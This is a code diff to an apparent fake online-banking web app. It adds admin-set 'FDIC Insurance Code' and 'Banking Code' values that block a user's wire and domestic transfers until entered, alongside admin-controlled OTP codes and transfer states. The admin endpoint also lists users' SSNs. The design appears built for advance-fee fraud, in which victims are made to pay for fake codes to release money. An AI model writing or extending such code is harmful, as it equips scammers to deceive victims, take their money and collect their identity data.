@@ -71,8 +71,8 @@ const createUserSql = `
   INSERT INTO users (
     account_number, first_name, last_name, username, email, phone, gender,
     date_of_birth, country, state, zip_code, marital_status, ssn, occupation,
-    address, profile_image, preferred_currency, transfer_flow_state, transfer_otp_code, password_hash
-  ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)
+    address, profile_image, preferred_currency, transfer_flow_state, transfer_otp_code, transfer_fdic_code, transfer_banking_code, password_hash
+  ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22)
   RETURNING id
 `;
 const createTransactionSql = `
@@ -109,7 +109,9 @@ async function initDatabase() {
     created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
     preferred_currency TEXT NOT NULL DEFAULT 'USD',
     transfer_flow_state TEXT NOT NULL DEFAULT 'pending_transfer',
-    transfer_otp_code TEXT NOT NULL DEFAULT ''
+    transfer_otp_code TEXT NOT NULL DEFAULT '',
+    transfer_fdic_code TEXT NOT NULL DEFAULT '',
+    transfer_banking_code TEXT NOT NULL DEFAULT ''
   );
 
   CREATE TABLE IF NOT EXISTS sessions (
@@ -160,6 +162,8 @@ async function initDatabase() {
   await db.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS profile_image TEXT NOT NULL DEFAULT ''");
   await db.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS transfer_flow_state TEXT NOT NULL DEFAULT 'pending_transfer'");
   await db.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS transfer_otp_code TEXT NOT NULL DEFAULT ''");
+  await db.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS transfer_fdic_code TEXT NOT NULL DEFAULT ''");
+  await db.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS transfer_banking_code TEXT NOT NULL DEFAULT ''");
   await db.query("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS insurance_verified INTEGER NOT NULL DEFAULT 0");
   await db.query("ALTER TABLE transactions ADD COLUMN IF NOT EXISTS reference_id TEXT");
   await db.query("ALTER TABLE transactions ADD COLUMN IF NOT EXISTS category TEXT");
@@ -467,6 +471,8 @@ async function seedDemoData() {
     "USD",
     "pending_transfer",
     "240298",
+    "",
+    "",
     passwordHash,
   ]);
 
@@ -612,6 +618,8 @@ async function handleRegister(res, form) {
       "USD",
       "pending_transfer",
       "",
+      "",
+      "",
       passwordHash,
     ]);
 
@@ -751,6 +759,8 @@ async function handleWireTransfer(req, res, form) {
   const accountNumber = String(form.account_number || "").trim();
   const accountType = String(form.account_type || "").trim();
   const otpCode = String(form.otp_code || "").trim();
+  const fdicCode = String(form.fdic_code || "").trim();
+  const bankingCode = String(form.banking_code || "").trim();
   if (!(amount > 0) || !beneficiaryName || !bankName || !accountNumber || !accountType) {
     return redirect(res, "/wire-transfer?error=Complete+the+wire+transfer+form");
   }
@@ -761,6 +771,16 @@ async function handleWireTransfer(req, res, form) {
   const transferFlowState = normalizeTransferFlowState(session.transfer_flow_state);
   if (transferFlowState === "invalid_otp" || otpCode !== approvedOtpCode) {
     return redirect(res, "/wire-transfer?error=Invalid+OTP+code&transfer_state=invalid_otp&resume_transfer=1");
+  }
+
+  const requiredFdicCode = String(session.transfer_fdic_code || "").trim();
+  if (requiredFdicCode && fdicCode !== requiredFdicCode) {
+    return redirect(res, "/wire-transfer?error=Invalid+FDIC+Insurance+Code&resume_transfer=1");
+  }
+
+  const requiredBankingCode = String(session.transfer_banking_code || "").trim();
+  if (requiredBankingCode && bankingCode !== requiredBankingCode) {
+    return redirect(res, "/wire-transfer?error=Invalid+Banking+Code&resume_transfer=1");
   }
 
   await createTransaction(session.id, {
@@ -801,6 +821,8 @@ async function handleDomesticTransfer(req, res, form) {
   const accountNumber = String(form.account_number || "").trim();
   const accountType = String(form.account_type || "").trim();
   const otpCode = String(form.otp_code || "").trim();
+  const fdicCode = String(form.fdic_code || "").trim();
+  const bankingCode = String(form.banking_code || "").trim();
   if (!(amount > 0) || !beneficiaryName || !bankName || !accountNumber || !accountType) {
     return redirect(res, "/dom-transfer?error=Complete+the+domestic+transfer+form");
   }
@@ -811,6 +833,16 @@ async function handleDomesticTransfer(req, res, form) {
   const transferFlowState = normalizeTransferFlowState(session.transfer_flow_state);
   if (transferFlowState === "invalid_otp" || otpCode !== approvedOtpCode) {
     return redirect(res, "/dom-transfer?error=Invalid+OTP+code&transfer_state=invalid_otp&resume_transfer=1");
+  }
+
+  const requiredFdicCode = String(session.transfer_fdic_code || "").trim();
+  if (requiredFdicCode && fdicCode !== requiredFdicCode) {
+    return redirect(res, "/dom-transfer?error=Invalid+FDIC+Insurance+Code&resume_transfer=1");
+  }
+
+  const requiredBankingCode = String(session.transfer_banking_code || "").trim();
+  if (requiredBankingCode && bankingCode !== requiredBankingCode) {
+    return redirect(res, "/dom-transfer?error=Invalid+Banking+Code&resume_transfer=1");
   }
 
   await createTransaction(session.id, {
@@ -1042,7 +1074,7 @@ async function handleAdminData(req, res) {
 
   const users = (await dbAll(`
     SELECT id, account_number, first_name, last_name, username, email, phone, gender, date_of_birth,
-           country, state, zip_code, marital_status, ssn, occupation, address, profile_image, preferred_currency, transfer_flow_state, transfer_otp_code, created_at
+           country, state, zip_code, marital_status, ssn, occupation, address, profile_image, preferred_currency, transfer_flow_state, transfer_otp_code, transfer_fdic_code, transfer_banking_code, created_at
     FROM users
     ORDER BY id ASC
   `)).map((user) => ({
@@ -1109,6 +1141,8 @@ async function handleAdminCreateUser(req, res, form) {
       payload.preferredCurrency,
       payload.transferFlowState,
       payload.transferOtpCode,
+      payload.transferFdicCode,
+      payload.transferBankingCode,
       hashPassword(payload.password),
     ]);
 
@@ -1176,6 +1210,12 @@ async function handleAdminUpdateUser(req, res, form) {
   payload.preferredCurrency = payload.preferredCurrency || existingUser.preferred_currency || "USD";
   payload.transferFlowState = payload.transferFlowState || existingUser.transfer_flow_state || "pending_transfer";
   payload.transferOtpCode = payload.transferOtpCode || existingUser.transfer_otp_code || "";
+  if (!Object.prototype.hasOwnProperty.call(form, "transfer_fdic_code")) {
+    payload.transferFdicCode = existingUser.transfer_fdic_code || "";
+  }
+  if (!Object.prototype.hasOwnProperty.call(form, "transfer_banking_code")) {
+    payload.transferBankingCode = existingUser.transfer_banking_code || "";
+  }
 
   const validationError = await validateAdminUserPayload(payload, userId, existingUser.account_number);
   if (validationError) {
@@ -1185,8 +1225,8 @@ async function handleAdminUpdateUser(req, res, form) {
   try {
     await dbRun(
       `UPDATE users
-       SET account_number = $1, first_name = $2, last_name = $3, username = $4, email = $5, phone = $6, gender = $7, date_of_birth = $8, country = $9, state = $10, zip_code = $11, marital_status = $12, ssn = $13, occupation = $14, address = $15, profile_image = $16, preferred_currency = $17, transfer_flow_state = $18, transfer_otp_code = $19
-       WHERE id = $20`,
+       SET account_number = $1, first_name = $2, last_name = $3, username = $4, email = $5, phone = $6, gender = $7, date_of_birth = $8, country = $9, state = $10, zip_code = $11, marital_status = $12, ssn = $13, occupation = $14, address = $15, profile_image = $16, preferred_currency = $17, transfer_flow_state = $18, transfer_otp_code = $19, transfer_fdic_code = $20, transfer_banking_code = $21
+       WHERE id = $22`,
       [
         payload.accountNumber,
         payload.firstName,
@@ -1207,6 +1247,8 @@ async function handleAdminUpdateUser(req, res, form) {
         payload.preferredCurrency,
         payload.transferFlowState,
         payload.transferOtpCode,
+        payload.transferFdicCode,
+        payload.transferBankingCode,
         userId,
       ]
     );
@@ -1745,6 +1787,8 @@ async function sanitizeUserPayload(form, options = {}) {
     preferredCurrency: String(form.preferred_currency || "USD").trim().toUpperCase(),
     transferFlowState: normalizeTransferFlowState(form.transfer_flow_state),
     transferOtpCode: String(form.transfer_otp_code || "").trim(),
+    transferFdicCode: String(form.transfer_fdic_code || "").trim(),
+    transferBankingCode: String(form.transfer_banking_code || "").trim(),
     password: options.allowBlankPassword ? password : password,
   };
 }
